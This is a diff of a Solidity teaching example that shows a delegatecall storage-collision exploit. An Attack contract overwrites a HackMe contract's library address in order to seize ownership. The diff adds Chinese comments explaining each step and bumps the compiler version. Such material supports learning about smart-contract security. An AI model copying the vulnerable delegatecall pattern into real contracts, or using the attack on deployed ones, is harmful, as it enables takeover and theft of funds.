@@ -1,5 +1,5 @@
-// SPDX-License-Identifier:MIT
-pragma solidity ^0.8.19;
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.17;
 
 /*
 This is a more sophisticated version of the previous exploit.
@@ -38,6 +38,7 @@ contract HackMe {
         owner = msg.sender;
     }
 
+    // 自己合約執行這一個lib address 會被替換掉。
     function doSomething(uint _num) public {
         lib.delegatecall(abi.encodeWithSignature("doSomething(uint256)", _num));
     }
@@ -56,8 +57,9 @@ contract Attack {
         hackMe = HackMe(_hackMe);
     }
 
+    // 被攻擊合約地址會被替換成攻擊合約的擁有者。
     function attack() public {
-        // override address of lib
+        // override address of lib，轉換合約地址格式。
         hackMe.doSomething(uint(uint160(address(this))));
         // pass any number as input, the function doSomething() below will
         // be called
